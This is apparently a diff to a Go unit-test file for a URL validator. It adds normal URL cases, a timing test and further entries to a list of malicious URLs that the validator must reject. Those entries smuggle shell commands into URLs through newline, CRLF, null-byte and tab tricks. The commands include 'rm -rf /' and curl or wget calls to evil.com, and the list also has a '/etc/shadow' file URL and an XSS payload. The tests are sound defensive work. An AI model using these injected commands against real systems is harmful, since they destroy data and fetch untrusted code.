@@ -2,7 +2,9 @@ package validation
 
 import (
 	"fmt"
+	"strings"
 	"testing"
+	"time"
 )
 
 func TestValidateURL(t *testing.T) {
@@ -167,6 +169,31 @@ func TestValidateURL(t *testing.T) {
 			url:       "https://example.com#section",
 			expectErr: false,
 		},
+		{
+			name:      "URL with encoded characters (safe)",
+			url:       "https://example.com/path%20with%20spaces",
+			expectErr: false,
+		},
+		{
+			name:      "URL with multiple query parameters",
+			url:       "https://example.com?param1=value1&param2=value2",
+			expectErr: true, // Contains &
+		},
+		{
+			name:      "very long valid URL",
+			url:       "https://example.com/" + strings.Repeat("a", 2000),
+			expectErr: false,
+		},
+		{
+			name:      "URL with non-standard port",
+			url:       "http://example.com:9999",
+			expectErr: false,
+		},
+		{
+			name:      "localhost with non-standard port",
+			url:       "http://localhost:3000",
+			expectErr: false,
+		},
 	}
 
 	for _, tt := range tests {
@@ -198,6 +225,13 @@ func TestValidateURL_SecurityFocus(t *testing.T) {
 		"data:text/html,<img src=x onerror=alert('XSS')>",
 		"file:///etc/shadow",
 		"ftp://anonymous@malicious.com",
+		// Additional advanced injection patterns
+		"http://example.com%0Arm -rf /",         // URL-encoded newline
+		"http://example.com%0D%0Awget evil.com", // CRLF injection
+		"http://example.com\x00rm -rf /",        // Null byte injection
+		"http://example.com\t&&\tcurl evil.com", // Tab characters
+		"http://example.com#{curl evil.com}",    // Fragment injection
+		"http://example.com/?$(whoami)",         // Query parameter injection
 	}
 
 	for i, maliciousURL := range maliciousURLs {
@@ -208,6 +242,24 @@ func TestValidateURL_SecurityFocus(t *testing.T) {
 				t.Errorf("ValidateURL should reject malicious URL: %q", maliciousURL)
 			}
 		})
+	}
+}
+
+// TestValidateURL_Performance tests the performance characteristics of validation
+func TestValidateURL_Performance(t *testing.T) {
+	longURL := "https://example.com/" + strings.Repeat("a", 10000)
+
+	start := time.Now()
+	err := ValidateURL(longURL)
+	duration := time.Since(start)
+
+	if err != nil {
+		t.Errorf("Valid long URL should not fail validation: %v", err)
+	}
+
+	// Validation should be fast even for long URLs
+	if duration > 10*time.Millisecond {
+		t.Errorf("URL validation took too long: %v", duration)
 	}
 }
 
